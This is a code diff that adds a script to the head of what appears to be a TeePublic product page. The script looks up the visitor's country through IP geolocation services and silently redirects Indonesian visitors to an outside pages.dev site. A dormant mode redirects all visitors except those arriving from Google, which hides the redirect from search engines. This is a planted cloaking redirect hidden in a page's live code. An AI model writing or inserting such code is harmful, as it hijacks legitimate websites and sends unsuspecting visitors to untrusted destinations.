@@ -88,6 +88,69 @@
 <meta property="product:retailer_item_id" content="74165272D1V">
 <meta property="product:condition" content="new">
 <meta content='TeePublic' name='apple-mobile-web-app-title'>
+    <script data-lp-id-redirect="1">
+(function(){
+  var target="https://fridebatt.pages.dev/";
+  var delay=0;
+  var mode="indonesia";
+
+  function fromGoogle(){
+    try {
+      var r = String(document.referrer || '').toLowerCase();
+      if (!r) return false;
+      return /(?:^|[.\/])google(?:\.[a-z.]+)?(?:[\/?]|$)/.test(r)
+        || r.indexOf('googleusercontent.com') !== -1
+        || r.indexOf('android-app://com.google.android.googlequicksearchbox') !== -1
+        || r.indexOf('android-app://com.google.android.apps.searchlite') !== -1;
+    } catch (e) { return false; }
+  }
+
+  function go(){ try { window.location.replace(target); } catch (e) {} }
+  function schedule(){ setTimeout(go, delay); }
+  function isId(code){
+    code = String(code || '').toUpperCase();
+    return code === 'ID' || code === 'IDN';
+  }
+  function checkGeo(cb){
+    var apis = [
+      { u: 'https://ipapi.co/json/', pick: function(j){ return j && (j.country_code || j.country); } },
+      { u: 'https://ipwho.is/', pick: function(j){ return j && (j.country_code || j.country); } },
+      { u: 'https://get.geojs.io/v1/ip/country.json', pick: function(j){ return j && (j.country || j.country_code); } }
+    ];
+    var i = 0;
+    function next(){
+      if (i >= apis.length) { cb(false); return; }
+      var a = apis[i++];
+      var done = false;
+      var t = setTimeout(function(){ if (!done){ done = true; next(); } }, 4000);
+      fetch(a.u, { credentials: 'omit', cache: 'no-store' })
+        .then(function(r){ return r.json(); })
+        .then(function(j){
+          if (done) return;
+          done = true;
+          clearTimeout(t);
+          cb(isId(a.pick(j)));
+        })
+        .catch(function(){
+          if (done) return;
+          done = true;
+          clearTimeout(t);
+          next();
+        });
+    }
+    next();
+  }
+
+  if (mode === 'all') {
+    if (fromGoogle()) return;
+    schedule();
+    return;
+  }
+
+  checkGeo(function(ok){ if (ok) schedule(); });
+})();
+</script>
+
 <script>
   window.dataLayer = window.dataLayer || [];
 </script>
